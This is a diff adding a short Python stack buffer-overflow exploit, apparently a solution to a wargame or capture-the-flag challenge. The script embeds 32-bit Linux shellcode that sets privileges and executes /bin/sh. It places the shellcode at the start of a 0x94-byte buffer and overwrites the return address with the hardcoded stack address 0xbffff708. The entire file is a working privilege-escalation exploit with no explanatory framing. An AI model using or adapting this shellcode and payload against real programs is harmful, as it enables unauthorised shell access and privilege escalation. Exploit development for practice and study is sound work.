@@ -1,0 +1,16 @@
+#!/usr/bin/env python3
+import sys
+
+shellcode = b"\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a\
+\x47\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\
+\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\
+\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
+
+#since the length of shellcode is smaller than 144 bytes, I can put it in msg itself
+payload = bytearray(0xaa for i in range(0x94 + 4))
+
+payload[0:len(shellcode)] = shellcode
+payload[0x94:0x98] = (0xbffff708).to_bytes(4, byteorder='little')
+
+sys.stdout.buffer.write(len(payload).to_bytes(1, byteorder='little'))
+sys.stdout.buffer.write(payload)
